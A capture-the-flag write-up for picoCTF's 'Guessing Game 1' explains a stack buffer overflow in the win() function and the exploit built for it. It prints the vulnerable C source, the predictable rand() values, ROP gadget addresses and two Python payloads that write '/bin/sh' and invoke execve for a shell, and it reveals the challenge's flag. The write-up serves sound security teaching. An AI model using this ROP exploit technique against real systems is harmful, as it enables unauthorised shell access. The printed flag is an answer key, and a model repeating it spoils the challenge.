
# Guessing Game 1

*Hard*

>### Description
>I made a simple game to show off my programming skills. See if you can beat it! [vuln](https://jupiter.challenges.picoctf.org/static/3087c07bcba6f4ca29aa2dffab66c19f/vuln) [vuln.c](https://jupiter.challenges.picoctf.org/static/3087c07bcba6f4ca29aa2dffab66c19f/vuln.c) [Makefile](https://jupiter.challenges.picoctf.org/static/3087c07bcba6f4ca29aa2dffab66c19f/Makefile) `nc jupiter.challenges.picoctf.org 28953`

### Solution

Lets look at the source code:
```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/stat.h>

#define BUFSIZE 100


long increment(long in) {
        return in + 1;
}

long get_random() {
        return rand() % BUFSIZE;
}

int do_stuff() {
        long ans = get_random();
        ans = increment(ans);
        int res = 0;

        printf("What number would you like to guess?\n");
        char guess[BUFSIZE];
        fgets(guess, BUFSIZE, stdin);

        long g = atol(guess);
        if (!g) {
                printf("That's not a valid number!\n");
        } else {
                if (g == ans) {
                        printf("Congrats! You win! Your prize is this print statement!\n\n");
                        res = 1;
                } else {
                        printf("Nope!\n\n");
                }
        }
        return res;
}

void win() {
        char winner[BUFSIZE];
        printf("New winner!\nName? ");
        fgets(winner, 360, stdin);
        printf("Congrats %s\n\n", winner);
}

int main(int argc, char **argv){
        setvbuf(stdout, NULL, _IONBF, 0);
        // Set the gid to the effective gid
        // this prevents /bin/sh from dropping the privileges
        gid_t gid = getegid();
        setresgid(gid, gid, gid);

        int res;

        printf("Welcome to my guessing game!\n\n");

        while (1) {
                res = do_stuff();
                if (res) {
                        win();
                }
        }

        return 0;
}
```

The normal flow of this program is that the user inputs a number to guess. And if it is correct, they can input their name, in the `win()` function. I notice two things:
- There isn't any flag mentioned in the code, so we probably need to get a shell.
- There is a buffer overflow in the win function. It gets a size of 360, while the buffer is only 100.

To get to the win function, you can just brute force, since it is only numbers from 1 to 100.

With a long payload as name input in the win function, using gdb, I found the offset between the user input and the return address. It is 120 bytes. 

I tried injecting shellcode, and using this ROP gadget: "jmp rsp", to jump to my code. But it only gave errors. I found out it was because the binary has NX enabled, which means the writable memory is not allowed to be executed. 

>I didn't really know how to exploit ROP, so I found a writeup to help me. (Apperently, rand() has a static seed, so it is the same every time. The first two numbers are 84 and 87)

The exploit has two parts:
- Write /bin/sh somewhere is memory
- Do a syscall on this written memory to get a shell

Luckily, the binary contains a lot of code so we have a lot of possible gadgets to work with. We find these gadgets (using ROPgadget) that allow us to write to rax, the first three function arguments, and use syscall:
```
0x00000000004163f4 : pop rax ; ret
0x0000000000400696 : pop rdi ; ret
0x0000000000410ca3 : pop rsi ; ret
0x000000000044cc26 : pop rdx ; ret
0x000000000040137c : syscall
```
We can also find the addresses of the `read()` and `main()` functions. And the location of some writeable memory, in the .bss section of the binary. 

So the first payload will look something like this:
```python
payload1 = b'a' * 120
payload1 += p64(pop_rax)
payload1 += p64(0)
payload1 += p64(pop_rdi)
payload1 += p64(0)
payload1 += p64(pop_rsi)
payload1 += p64(bss)
payload1 += p64(pop_rdx)
payload1 += p64(9)
payload1 += p64(read)
payload1 += p64(main)

shell_line = b'/bin/sh\x00'
```
It will call the read function, after which we will supply it with the shell string. Lastly it returns to main so we can exploit the overflow in `win()` once more.

The second payload uses a syscall to call `execve()`, and run the shell. The payload looks like this:
```python
payload2 = b'a' * 120
payload2 += p64(pop_rax)
payload2 += p64(0x3b)
payload2 += p64(pop_rdi)
payload2 += p64(bss)
payload2 += p64(pop_rsi)
payload2 += p64(0)
payload2 += p64(pop_rdx)
payload2 += p64(0)
payload2 += p64(syscall)
```

The full code I used is available [here](./exploit.py). With the remote shell, you can easily read the flag.txt file.

<details>
<summary>Yes! We got the flag:</summary> 
picoCTF{r0p_y0u_l1k3_4_hurr1c4n3_b30e66e722f3f0d0}
</details>